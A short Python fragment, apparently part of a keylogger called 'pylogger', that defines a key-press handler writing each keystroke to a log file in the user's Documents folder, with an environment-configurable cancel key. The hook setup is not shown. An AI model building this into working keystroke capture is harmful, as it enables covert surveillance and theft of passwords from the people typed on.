import os

log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('~/Documents/file.log')
)

# Allow setting the cancel key from environment args, Default: `
cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
) 

def OnKeyPress(event):
    """creating key pressing event and saving it into log file
    
    Arguments:
        event -- Key down event
    """

    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))
